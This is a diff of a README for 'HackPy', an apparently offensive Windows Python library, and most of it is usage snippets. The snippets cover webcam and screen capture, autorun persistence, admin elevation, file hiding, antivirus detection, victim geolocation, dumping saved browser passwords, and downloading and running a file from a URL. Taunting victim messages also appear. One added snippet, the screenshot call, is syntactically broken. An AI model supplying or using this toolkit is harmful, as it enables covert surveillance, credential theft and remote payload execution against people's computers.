@@ -9,18 +9,34 @@ import os
 import hackpy
 ```
 
-# Get user information
+# Get user and system information
+![SystemInfo](https://i.ibb.co/b3gmsxg/hackpy-System-Info.png)
 ``` python
 print(
-	'\nWelcome to HackPy!' +
-	'\nUsername: ' + hackpy.username +
-	'\nComputername: ' + hackpy.computername
+	'\nWelcome to HackPy!\n' +
+	'\nUsername: '     + hackpy.userInfo +
+    '\nVersion:'       + hackpy.versionInfo +
+    '\nRelease: '      + hackpy.releaseInfo +
+    '\nSystem: '       + hackpy.systemInfo +
+    '\nNode: '         + hackpy.nodeInfo +
+    '\nMachine: '      + hackpy.machineInfo +
+    '\nProcessor: '    + hackpy.processorInfo +
+    '\nPlatform: '     + hackpy.platformInfo +
+    '\nArchitecture: ' + hackpy.architectureInfo[0]
 	)
 ```
 
 # Webcam screenshot
 ``` python
 hackpy.webcam(filename = 'screenshot.png', delay = 4500, camera = 1)
+```
+
+# Desktop screenshot
+``` python
+def screenshot(file = 'desktop.png'):
+    hackpy.command.nircmdc('savescreenshotfull ' file)
+
+screenshot()
 ```
 
 # TaskManager
@@ -51,9 +67,34 @@ hackpy.autorun('C:\\Windows\\System32\\cmd.exe', state = True)
 hackpy.autorun('C:\\Windows\\System32\\cmd.exe', state = False)
 ```
 
+# Check if program running as admin
+``` python
+if (hackpy.isAdmin()): # return True if program started as admin
+    print('Program started as admin! Loading cmd.exe')
+    status = hackpy.file.startAsAdmin('cmd.exe') # return true in [0] if all is okay and message in [1]
+    print('Okay, debugMessage:', status[1])
+
+else:
+    print('Program started as user!')
+```
+
+# Simple file control
+``` python
+hackpy.file.exists('file.txt')                # Return True or False
+hackpy.file.remove('file.txt')                # Remove file
+hackpy.file.rename('file.txt', 'newfile.txt') # Rename file
+hackpy.file.copy('file.txt', 'C:\\Windows')   # Copy file
+hackpy.file.scan('C:\\')                      # Return all files in directory
+hackpy.file.start('file.txt')                 # Start file 
+hackpy.file.startAsAdmin('file.txt')          # Start file as admin
+hackpy.file.atributeHidden('file.txt')        # Hide file
+hackpy.file.atributeNormal('file.txt')        # Show file
+```
+
 # Detect installed antivirus software on computer:
 ``` python 
-for antivirus in hackpy.detect_protection():
+data = hackpy.detectProtection()
+for antivirus in data:
     print('[!] - Antivirus detected: ' + antivirus + ', install path: ' + data[antivirus])
 ```
 
@@ -75,6 +116,11 @@ print('[?] - Latitude: ' + data['geoplugin_latitude'])
 # Return dict: {"geoplugin_request", "geoplugin_status", "geoplugin_delay", "geoplugin_credit", "geoplugin_city", "geoplugin_region", "geoplugin_regionCode", "geoplugin_regionName", "geoplugin_areaCode", "geoplugin_dmaCode", "geoplugin_countryCode", "geoplugin_countryName", "geoplugin_inEU", "geoplugin_euVATrate", "geoplugin_continentCode", "geoplugin_continentName", "geoplugin_latitude", "geoplugin_longitude", "geoplugin_locationAccuracyRadius", "geoplugin_timezone", "geoplugin_currencyCode", "geoplugin_currencySymbol", "geoplugin_currencySymbol_UTF8", "geoplugin_currencyConverter"}
 ```
 
+# Sleep
+``` python
+hackpy.sleep(5) # Wait 5 secounds
+```
+
 # Get router bssid:
 ``` python
 # Get router BSSID
@@ -94,6 +140,12 @@ print(
 hackpy.messagebox('error', 'LOL', 'System has been killed :D')
 ```
 
+# Change desktop wallpaper:
+```python 
+image = 'C:\\users\\Admin\\wallpaper.png'
+hackpy.setWallpaper(image) # BETA
+```
+
 # Nircmdc commands
 ![SITE](https://i.ibb.co/znRLN0D/image.png)
 ``` python
@@ -108,9 +160,21 @@ hackpy.command.nircmdc('speak text \"HAHAHAHAHHAH IM FIND YOU!\"')
 hackpy.command.system('shutdown -s -t 260')
 ```
 
+# Passwords recovery
+![SITE](https://i.ibb.co/nnjYFxV/hackpy-passwords-Recovery.png)
+``` python
+for key, account in hackpy.passwordsRecovery().items():
+    print(
+        '\n['  + str(key) + ']'
+        '\n|____ site: ' + account['url'] + 
+        '\n |___ user: ' + account['login'] + 
+        '\n  |__ pass: ' + account['password']
+        )
+```
+
 # SendKeyPress:
 ``` python
-hackpy.sendkey('Hello bro{ENTER}')
+hackpy.sendKey('Hello bro{ENTER}')
 # Other keys: https://pastebin.com/Ns3P7UiH
 ```
 
@@ -126,15 +190,15 @@ hackpy.clipboard.set('Hello from LimerBoy and HackPy!!')
 # Download python and install it:
 ``` python
 # Check if python installed on system. False - not installed, True - installed.
-if hackpy.check_python() == False: 
+if hackpy.checkPython() == False: 
     print('Python is not installed, trying to install!')
     # Default version is 3.7.0 and install path is C:\python37
-    hackpy.install_python('3.6.0', path = 'C:\\python36') 
+    hackpy.installPython('3.6.0', path = 'C:\\python36') 
 else:
     print('Python is installed!')
 ```
 
-# Load and execute file from internet
+# Load and run file from internet
 ``` python
 # Download file
 file = hackpy.wget(url)
@@ -142,8 +206,29 @@ file = hackpy.wget(url)
 os.startfile(file)
 ```
 
-# Passwords recovery
+# Get active window
 ``` python
-# This function just download LaZagne and execute it..
-passwords_recovery(filename = 'passwords.txt')
+window = hackpy.getActiveWindow() # return active window
+print('You active window is: ' + window)
 ```
+
+# Power
+``` python
+hackpy.power.reboot()     # Reboot
+hackpy.power.shutdown()   # Shutdown
+hackpy.power.logoff()     # Logoff
+hackpy.power.hibernate()  # Hibernate
+```
+
+# Get cursor position
+``` python
+position = hackpy.getCursorPos() # return cursor position
+print(
+    'You cursor position is: ' +  
+    '\nX: ' + str(position[0]) + 
+    '\nY: ' + str(position[1])
+    )
+
+hackpy.setCursorPos(100, 500) # x, y | BETA
+```
+
